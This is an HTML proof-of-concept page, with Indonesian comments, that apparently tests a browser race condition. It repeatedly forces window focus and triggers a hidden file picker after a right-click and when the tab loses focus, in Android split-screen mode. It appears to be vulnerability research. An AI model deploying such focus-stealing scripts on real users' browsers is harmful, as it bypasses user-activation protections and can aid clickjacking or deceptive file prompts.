<!doctype html>
<html>
  <head>
    <title>POC: Focus-Stealing & Race Condition</title>
    <style>
      body {
        font-family: sans-serif;
        text-align: center;
        padding-top: 50px;
      }
      #link {
        padding: 20px;
        border: 2px dashed red;
        cursor: pointer;
        display: block;
      }
      .status {
        margin-top: 20px;
        color: blue;
      }
      input {
        display: none;
      }
    </style>
  </head>
  <body>
    <h1>Race Condition Test</h1>
    <p>Buka dalam mode <b>Split Screen</b> (Contoh: Edge/Chrome di Android).</p>

    <a id="link"
      >1. Klik Kanan Sini (Split)<br />2. Cepat klik aplikasi sebelah!</a
    >

    <div id="status" class="status">Menunggu interaksi...</div>

    <input id="fileSelect" type="file" />

    <script>
      const link = document.getElementById("link");
      const fileSelect = document.getElementById("fileSelect");
      const status = document.getElementById("status");

      link.addEventListener("contextmenu", function (event) {
        status.innerText = "Trigger dimulai... Segera pindah fokus!";

        // Skenario Race Condition:
        // Mencoba memicu input berulang kali dalam jendela waktu yang sempit
        // saat transisi fokus terjadi.

        let attempts = 0;
        const interval = setInterval(() => {
          attempts++;

          // Coba curi fokus kembali secara paksa sebelum klik
          window.focus();

          // Pemicuan file picker
          fileSelect.click();

          if (attempts > 10) {
            clearInterval(interval);
            status.innerText = "Siklus percobaan selesai.";
          }
        }, 500); // Interval 500ms untuk mencari celah saat tab menjadi 'inactive'
      });

      // Listener tambahan untuk mendeteksi kapan tab kehilangan fokus
      window.addEventListener("blur", () => {
        console.log("Tab menjadi Inactive (Blur detected)");
        // Beberapa browser memiliki celah di mana event 'blur'
        // masih mengizinkan satu aksi terakhir dari script yang berjalan.
        setTimeout(() => {
          fileSelect.click();
        }, 50);
      });
    </script>
  </body>
</html>
